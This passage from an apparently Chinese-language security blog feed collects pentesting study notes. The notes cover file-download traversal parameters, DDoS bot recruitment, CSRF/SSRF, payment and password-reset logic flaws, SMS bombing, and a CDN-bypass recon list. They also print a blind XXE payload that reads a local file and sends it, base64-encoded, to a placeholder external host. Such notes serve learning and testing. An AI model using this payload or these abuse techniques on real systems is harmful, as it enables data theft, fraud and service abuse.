phpinfo();?><br>访问ip&#x2F;include.php?filename&#x3D;index.txt</p><h1 id="SEVEN-文件下载"><a href="#SEVEN-文件下载" class="headerlink" title="SEVEN:文件下载"></a>SEVEN:文件下载</h1><p>read.xxx?filename&#x3D;<br>down.xxx?filename&#x3D;<br>readfile.xxx?file&#x3D;<br>downfile.xxx?file&#x3D;<br>..&#x2F; ..\ .\ .&#x2F;等<br>&amp;readpath&#x3D;、&amp;filepath&#x3D;、&amp;path&#x3D;、&amp;inputfile&#x3D;、&amp;url&#x3D;、&amp;data&#x3D;、&amp;readfile&#x3D;、&amp;menu&#x3D;、META-INF&#x3D;<br>文件下载中..&#x2F;的使用</p><h1 id="EIGHT-DDos"><a href="#EIGHT-DDos" class="headerlink" title="EIGHT:DDos"></a>EIGHT:DDos</h1><p>1.定义：分布式拒绝服务攻击(英文意思是Distributed Denial of Service，简称DDoS)是指处于不同位置的多个攻击者同时向一个或数个目标发动攻击，或者一个攻击者控制了位于不同位置的多台机器并利用这些机器对受害者同时实施攻击。由于攻击的发出点是分布在不同地方的，这类攻击称为分布式拒绝服务攻击。<br>2.它产生的原因就是大量的攻击者洪水般访问目标网站，从而使网站无法对用户服务进行响应。<br>3.产生条件：需要大量的肉鸡，也就是傀儡机。<br>4.DDoS攻击流程<br>1.信息搜集<br>被攻击目标主机数目、地址情况<br>目标主机的配置、性能<br>目标的带宽<br>2.占领傀儡机<br>黑客最感兴趣的是有下列情况的主机：<br>链路状态好的主机<br>性能好的主机<br>安全管理水平差的主机</p><h1 id="NINE-csrf-ssrf"><a href="#NINE-csrf-ssrf" class="headerlink" title="NINE:csrf ssrf"></a>NINE:csrf ssrf</h1><p>1..CSRF（Cross-site request forgery），中文名称：跨站请求伪造<br>攻击者借用了你的身份，以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……造成的问题包括：个人隐私泄露以及财产安全。<br>判断一个网站是否存在CSRF漏洞：就是判断其对关键信息（比如密码等敏感信息）的操作(增删改)是否容易被伪造。<br>利用：1.需要被攻击这登录在网站上2.需要点击链接。<br>防御：–对敏感信息的操作增加安全的token；<br>–对敏感信息的操作增加安全的验证码；<br>–对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。<br>和xss的区别，xss是获取用户cookie,用用户的身份实施破坏，<u>而csrf是借用用户的权限完成攻击</u>。<br>理论上讲，url跳转属于CSRF的一种，我们需要对传入的URL做有效性的认证，保证该URL来自于正确的地方</p><p>2.SSRF(Server-Side Request Forgery:服务器端请求伪造):从其他服务器应用获取数据的功能, 利用有缺陷的web应用作为跳板攻击远程和内网的服务器。<u>a可以访问b，b可以访问c，但是a不可以访问c.</u><br>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</p><h1 id="TEN-逻辑漏洞："><a href="#TEN-逻辑漏洞：" class="headerlink" title="TEN:逻辑漏洞："></a>TEN:逻辑漏洞：</h1><p>1.登录点暴力破解<br>2.http和https 只有知道加密方式才可以进行爆破<br>3.  cookie脆弱<br>4.支付：数量负数，超过int值。更改订单编号，购买价格，修改商品信息：编号，名字、更改支付接口：微信，支付宝，自己的支付接口，支付状态，优惠券。<br>二.找回密码<br>找回密码：找回重置机制：客户端回显 resp状态码，验证码爆破，找回流程绕过。<br>接口调用乱用：短信轰炸，来电轰炸。<br>修改账号密码：到重置密码页面不提交，抓包修改手机号后进行重置密码操作。已达到登录别人账号的操作<br>客户端：在浏览器里可以看到验证码2.抓包里面显示<br>resp状态码：可以是1,0来判断正确错误  do 模块  前端验证而不是数据库验证<br>爆破验证码<br>接口安全：短信轰炸，来电轰炸。</p><p>挖 功能点 参数<br>一.业务逻辑漏洞<br>支付：数量负数，超过int值。更改订单编号，购买价格，修改商品信息：编号，名字、更改支付接口：微信，支付宝，自己的支付接口，支付状态，优惠券。<br>二.用户身份：<br>暴力破解，密码找回:前端验证，短信轰炸，验证码爆破。cookie,session.<br>三验证码绕过：<br>验证码复用，后端没有对验证码进行销毁<br>前端，验证码一次正确，之后验证码不检测了。 发送60秒一次<br>token 替换爆破（需要一些设置） 前提：res包有token回显  密码和token值的爆破<br>四.接口<br>水平越权  wang uid&#x3D;10  设置为1-1000爆破<br>callback 跨站   spi爬虫 批量查询功能点如：id</p><h1 id="ELEVEN-中间件"><a href="#ELEVEN-中间件" class="headerlink" title="ELEVEN:中间件"></a>ELEVEN:中间件</h1><p>常见中间件：iis,tomcat,apache,nginx,jboss,weblogic.</p><p>IIS是Windows操作系统，而Tomcat是JSP语言环境，其实它也是Apache旗下的一种，不过开发环境不一样。一般Apache主要是Linux操作系统中使用较多。Nginx 是一个高性能的HTTP和反向代理服务，也是一个IMAP&#x2F;POP3&#x2F;SMTP服务。它以稳定性、丰富的功能集、示例配置文件和低系统资源的消耗而闻名。<br>中间件利用<br>1.一般本地开发的话，小项目，或者是个人开发建议使用tomcat。<br>2.linux系统建议使用jetty或apache httpd<br>3.大型的项目就用JBOSS或webloigc</p><p>4.大项目或者商业项目一般采用：weblgoic&#x2F;webshere，其他的还有jboss、glasshfish等<br>5.一些示例项目或者小项目常采用jetty</p><p>web中间件用于提供系统软件和应用软件之间的连接，以便于软件各部件之间的沟通，其可以为一种或多种应用程序提供容器。<br>中间件是位于操作系统和应用软件之间的通用服务<br>web容器用于给处于其中的应用程序组件（JSP，SERVLET）提供一个环境，是中间件的一个组成部分，它实现了对动态语言的解析。<br>web中间件与web服务器是有重叠的，原因在于tomcat等web中间件也具备web服务器的功能。 </p><p>内容管理系统（content management system，CMS），是一种位于WEB前端（Web 服务器）和后端办公系统或流程（内容创作、编辑）之间的软件系统。内容的创作人员、编辑人员、发布人员使用内容管理系统来提交、修改、审批、发布内容。如OA</p><p>web：一.网站源码：cms   二.搭建平台：中间件安全     三.数据库<br>asp+access     php+mysql    aspx+mssql    jsp+mssql,oracle    python+mongodb</p><p>别人浏览你的asp页面是先发送请求到你的服务器 然后你的服务器就把通过IIS解析后的页面 返回给请求者<br>asp           iis+access<br>aspx          iis+mssql<br>Servlet（Server Applet）是Java Servlet的简称，称为小服务程序或服务连接器，用Java编写的服务器端程序，具有独立于平台和协议的特性，主要功能在于交互式地浏览和生成数据，生成动态Web内容。<br>tomcat      支持servlet,jsp</p><p>Payload是黑客用来与被黑了的系统交互的简单脚本，指成功exploit之后，真正在目标系统执行的代码或指令。<br>exp:漏洞利用程序或代码。<br>poc:漏洞验证程序<br>为了开发一个动态网站出来，有3中选择<br>1、ASP.NET<br>ASP.NET 的开发框架是 Windows server +IIS+SQL Server+ASP的组合，主要开发语言有C#.NET和VB.NET。<br>2、J2EE开发平台<br>J2EE的开发架构是 UNIX&#x2F;windows+Tomcat+Orecle+JSP的组合，主要是用JAVA编写程序。比如Android平台级应用的网页后台用户管理端<br>3、LAMP开发平台<br>LAMP的开发架构是 Linux+Apache+MySQL+PHP，主要是用PHP来编写程序。比如Facebook</p><h1 id="twelve-xxe"><a href="#twelve-xxe" class="headerlink" title="twelve:xxe"></a><strong>twelve:xxe</strong></h1><p>xml:是数据内容，传输和存储数据格式类型。<br>xxe:xml的漏洞注入全称，xml外部实体注入<br>xml :为传输和存储数据，焦点是数据内容  html:用来显示数据，焦点是数据的外观<br>利用：1..有回显得，文件读取2.内网探针或攻击内网应用。3.引入外部实体dtd<br>          2.无回显：读取文件，  增加代码复杂度，base64编码。 类似内网反弹效果，可以在日志文件看到攻击者操作。只需base64编码就可读取看到文件内容。</p><p>检测：白盒<br>黑盒：人工，工具<br>人工 ：关键字：1.数据格式类型：<user>teset</user><pass>Mikasa</pass><br>2.content-Type值判断：text&#x2F;xml    application&#x2F;xml<br>3.更改content-Type值为上面类型，检测是否有xxe漏洞。</p><p>无回显的代码，其中路径不用完整路径。所以无回显的利用较多。</p><?xml version="1.0" encoding="UTF-8" ?><!DOCTYPE note [    <!ENTITY hack "hello world"><p>]&gt;<br><name>&amp;hack;</name></p><p>无回显的代码，其中路径不用完整路径。所以无回显的利用较多。代码有增加其复杂度来达到绕过的那种意思。</p><?xml version = "1.0"?><!DOCTYPE test [        <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=d:/test.txt"><pre><code>    &lt;!ENTITY % dtd SYSTEM &quot;http://192.168.xx.xxx:80XX/test.dtd&quot;&gt;    %dtd;    %send;</code></pre><p>]&gt;</p><p>test.dtd:<br><!ENTITY % payload    "<!ENTITY &#x25; send SYSTEM'http://192.168.xx.xxx:80xx/?data=%file;'>“</p><blockquote><p>%payload;</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>cdn绕过</title>
      <link href="/2022/04/06/cdn-rao-guo/"/>
      <url>/2022/04/06/cdn-rao-guo/</url>
      
        <content type="html"><![CDATA[<p>1.从子域名查询入手  www. 和无www.<br>2.邮件服务，邮箱服务：一般无CDN,正反向的不同<br>3.国外地址请求<br>4.遗留文件：phpinfo.php 扫描全站：同地区可能无cdn<br>5.黑暗引擎： MD5 hash<br>6.dns历史记录<br>7.m.手机访问网站  .ico图标</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
